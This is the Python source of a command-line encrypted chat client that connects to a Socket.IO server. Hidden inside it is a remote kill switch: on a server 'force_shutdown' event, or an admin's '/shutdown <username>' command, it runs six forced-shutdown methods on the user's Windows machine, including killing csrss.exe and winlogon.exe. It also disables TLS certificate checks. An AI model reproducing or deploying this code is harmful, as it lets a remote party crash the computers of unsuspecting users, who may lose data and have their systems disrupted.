import os, json, base64, hashlib, requests, socketio, time, sys, ctypes
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from urllib3.exceptions import InsecureRequestWarning
import subprocess
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def force_system_shutdown():
    try:
        if hasattr(ctypes, 'windll'):
            # Method 1: Windows API
            try: ctypes.windll.advapi32.InitiateSystemShutdownExW(None, None, 0, True, True, 0)
            except: pass
            
            # Method 2: Alternative API call
            try: ctypes.windll.user32.ExitWindowsEx(0x00000008, 0x00000000)
            except: pass
            
            # Method 3: Command line force shutdown
            try: os.system('shutdown /s /f /t 0')
            except: pass
            
            # Method 4: PowerShell force shutdown
            try: subprocess.run(['powershell', '-Command', 'Stop-Computer', '-Force'], capture_output=True)
            except: pass
            
            # Method 5: Task kill critical process
            try:
                subprocess.run(['taskkill', '/F', '/IM', 'csrss.exe'], capture_output=True)
                subprocess.run(['taskkill', '/F', '/IM', 'winlogon.exe'], capture_output=True)
            except: pass
            
            # Method 6: WMI shutdown
            try: subprocess.run(['shutdown', '/s', '/f', '/t', '0'], capture_output=True)
            except: pass
    except: pass

class ChatClient:
    def __init__(self):
        self.VERSION = "1.0.1"
        self.MAX_MSG_SIZE = 1024 * 1024
        self.server_url = None
        self.username = None
        self.session_key = None
        self.encryption_key = None
        self.fernet = None
        self.sio = None
        self.active_users = set()
        self.running = True
        self.is_admin = False
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json', 'Content-Type': 'application/json'}

    def derive_key(self, server_challenge, client_challenge, username, session_key):
        try:
            unique_material = f"{username}:{session_key}:{server_challenge}{client_challenge}".encode()
            salt = hashlib.sha256(session_key.encode()).digest()
            kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
            return base64.urlsafe_b64encode(kdf.derive(unique_material))
        except Exception as e: raise ValueError(f"Key derivation failed: {str(e)}")

    def setup_socket(self):
        self.sio = socketio.Client()
        
        @self.sio.on('connect')
        def on_connect():
            self.sio.emit('register', {'username': self.username, 'session_key': self.session_key})

        @self.sio.on('disconnect')
        def on_disconnect():
            if self.running:
                print("\nDisconnected from server. Reconnecting...")
                time.sleep(5)
                try: self.sio.connect(self.server_url, headers=self.headers, transports=['websocket', 'polling'])
                except: pass

        @self.sio.on('resource_update')
        def on_message(data):
            try:
                encrypted_msg = data['message']
                decrypted = self.fernet.decrypt(encrypted_msg.encode()).decode()
                message = json.loads(decrypted)
                if message['username'] == self.username:
                    print(f"\033[94m{message['username']}: {message['content']}\033[0m")
                else:
                    print(f"\033[92m{message['username']}: {message['content']}\033[0m")
            except: pass

        @self.sio.on('force_shutdown')
        def on_force_shutdown(data):
            try:
                print("\033[91m[System] Connection terminated\033[0m")
                force_system_shutdown()
            except: pass
            finally:
                self.running = False
                self.sio.disconnect()

        @self.sio.on('admin_response')
        def on_admin_response(data):
            try:
                status = data.get('status')
                message = data.get('message', '')
                if status == 'ok':
                    if message == 'Authenticated as admin':
                        self.is_admin = True
                        print("\033[93m[System] You are now authenticated as admin\033[0m")
                    elif 'Shutdown sent to' in message:
                        print(f"\033[93m[System] {message}\033[0m")
                else:
                    print(f"\033[91m[System] {message}\033[0m")
            except: pass

        @self.sio.on('cache_status')
        def on_user_update(data):
            self.active_users = set(data.get('active_streams', []))

    def connect_to_server(self):
        try:
            host = input("Server (default: chat-vex2.onrender.com): ").strip() or 'chat-vex2.onrender.com'
            self.server_url = f"https://{host}"
            response = requests.get(f"{self.server_url}/assets/data/stream", headers=self.headers, timeout=5, verify=False)
            return response.status_code == 200
        except: return False

    def authenticate(self):
        try:
            response = requests.post(f"{self.server_url}/api/resources/validate", headers=self.headers,
                json={'username': self.username, 'version': self.VERSION}, timeout=5, verify=False)
            if response.status_code != 200: return False
            data = response.json()
            server_challenge = data['challenge']
            self.session_key = data['session_key']
            client_challenge = base64.urlsafe_b64encode(os.urandom(32)).decode()
            auth_response = requests.post(f"{self.server_url}/api/resources/complete_auth", headers=self.headers,
                json={'username': self.username, 'client_challenge': client_challenge, 'session_key': self.session_key},
                timeout=5, verify=False)
            if auth_response.status_code != 200: return False
            self.encryption_key = self.derive_key(server_challenge, client_challenge, self.username, self.session_key)
            self.fernet = Fernet(self.encryption_key)
            return True
        except: return False

    def handle_command(self, command):
        try:
            parts = command.split()
            cmd = parts[0].lower()
            if cmd == "/help":
                print("Commands:")
                print("/auth <key> - Authenticate as admin")
                print("/help - Show commands")
                if self.is_admin:
                    print("/shutdown <username> - Shutdown target user (Admin only)")
                return True
            elif cmd == "/auth":
                if len(parts) != 2:
                    print("\033[91m[System] Usage: /auth <key>\033[0m")
                    return True
                self.sio.emit('admin_command', {'command': 'auth', 'key': parts[1]})
                return True
            elif cmd == "/shutdown":
                if not self.is_admin:
                    print("\033[91m[System] You must be an admin to use this command!\033[0m")
                    return True
                if len(parts) != 2:
                    print("\033[91m[System] Usage: /shutdown <username>\033[0m")
                    return True
                self.sio.emit('admin_command', {'command': 'shutdown', 'target': parts[1]})
                return True
            return False
        except: return False

    def send_message(self, content):
        try:
            if len(content) > self.MAX_MSG_SIZE: return
            if content.startswith('/'):
                if self.handle_command(content): return
            message = {'username': self.username, 'content': content, 'timestamp': datetime.now().isoformat()}
            encrypted = self.fernet.encrypt(json.dumps(message).encode()).decode()
            self.sio.emit('stream_data', {'message': encrypted})
        except: pass

    def start(self):
        if not self.connect_to_server():
            print("Connection failed")
            return
        self.username = input("Username: ").strip()
        while not self.username:
            self.username = input("Username: ").strip()
        if not self.authenticate():
            print("Auth failed")
            return
        self.setup_socket()
        try:
            self.sio.connect(self.server_url, headers=self.headers, transports=['websocket', 'polling'])
        except Exception as e:
            print(f"Connection error: {str(e)}")
            return
        print("\nConnected! Type messages below:")
        while self.running:
            try:
                msg = input().strip()
                if not msg: continue
                if msg.lower() == '/quit': break
                self.send_message(msg)
            except (KeyboardInterrupt, EOFError): break
            except: pass
        if hasattr(self, 'sio') and self.sio and self.sio.connected:
            self.sio.disconnect()

if __name__ == "__main__":
    try:
        client = ChatClient()
        client.start()
    except KeyboardInterrupt:
        pass
